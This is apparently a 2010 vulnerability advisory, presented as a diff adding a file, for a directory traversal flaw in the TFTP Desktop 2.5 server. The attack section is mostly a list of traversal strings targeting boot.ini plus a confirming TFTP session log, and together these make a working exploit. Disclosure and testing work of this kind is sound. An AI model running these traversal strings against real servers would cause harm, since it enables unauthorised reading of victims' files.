@@ -1,0 +1,68 @@
++------------------------------------------------------------------------+
+|                                 .......                                |
+|                         ..''xxxxxxxxxxxxxxx'...                        |
+|                    ..'xxxxxxxxxxxxxxxxxxxxxxxxxxx..                    |
+|                 ..'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'.                 |
+|               .'xxxxxxxxxxxxxxxxxxxxxxxxxxxx'''.......'.               |
+|             .'xxxxxxxxxxxxxxxxxxxxx''......        ...  ..             |
+|            .xxxxxxxxxxxxxxxxxx'...         ........      .'.           |
+|           'xxxxxxxxxxxxxxx'......                          '.          |
+|          'xxxxxxxxxxxxxx'..'x..                            .x.         |
+|         .xxxxxxxxxxxx'...'..                  ...           .'         |
+|         'xxxxxxxxx'..  .                          ..        .x.        |
+|         xxxxxxx'.                                  ..        x.        |
+|         xxxx'.                ....                  x        x.        |
+|         'x'.            ...'xxxxxxx'.               x       .x.        |
+|         .x'.         .'xxxxxxxxxxxxxx.             ''       .'         |
+|          .xx.      .'xxxxxxxxxxxxxxxx.           .'xx'''.  .'          |
+|           .xx..    'xxxxxxxxxxxxxxxx'          .'xxxxxxxxx''.          |
+|            .'xx'.  .'xxxxxxxxxxxxxxx.      ..'xxxxxxxxxxxx'            |
+|              .xxx'.  .xxxxxxxxxxxx'.    .'xxxxxxxxxxxxxx'.             |
+|                .xxxx'.'xxxxxxxxx'.      xxx'xxxxxxxxxx'.               |
+|                  .'xxxxxxx'....          ...xxxxxxx'.                  |
+|                     ..'xxxxx'..         ..xxxxx'..                     |
+|                          ....'xx'.....''''...                          |
+|                                                                        |
+|                    CubilFelino Security Research Labs                  |
+|                            proudly presents...                         |
++------------------------------------------------------------------------+
+
+
+Author: chr1x (chr1x@sectester.net)
+Date: August 30, 2010
+Affected operating system/software, including full version details
+TFTP Desktop version 2.5, Tested on Windows XP PRO SP3
+Download:
+http://www.mynet2.com/soft/Software%20Archive/TFTP%20Server/tftp_desktop_free.exe
+
+How the vulnerability can be reproduced
+
+Attack strings below:
+
+[*] Testing Path: .../.../.../boot.ini  <- Vulnerable string!!
+[*] Testing Path: .../.../.../.../boot.ini  <- Vulnerable string!!
+[*] Testing Path: .../.../.../.../.../boot.ini  <- Vulnerable string!!
+[*] Testing Path: .../.../.../.../.../.../boot.ini  <- Vulnerable string!!
+[*] Testing Path: .../.../.../.../.../.../.../boot.ini  <- Vulnerable string!!
+[*] Testing Path: .../.../.../.../.../.../.../.../boot.ini  <- Vulnerable string!!
+[*] Testing Path: ...\...\...\boot.ini  <- Vulnerable string!!
+[*] Testing Path: ...\...\...\...\boot.ini  <- Vulnerable string!!
+[*] Testing Path: ...\...\...\...\...\boot.ini  <- Vulnerable string!!
+[*] Testing Path: ...\...\...\...\...\...\boot.ini  <- Vulnerable string!!
+[*] Testing Path: ...\...\...\...\...\...\...\boot.ini  <- Vulnerable string!!
+[*] Testing Path: ...\...\...\...\...\...\...\...\boot.ini  <- Vulnerable string!!
+
+Confirmation log:
+
+root@olovely:/# tftp
+tftp> connect
+(to) 192.168.1.53
+tftp> ascii
+tftp> get
+(files) .../.../.../.../.../.../boot.ini
+Received 211 bytes in 0.0 seconds
+tftp> quit
+
+What impact the vulnerability has on the vulnerable system
+
+* High, since when exploiting the vulnerability the attacker is able to get full access to the victim filesystem.
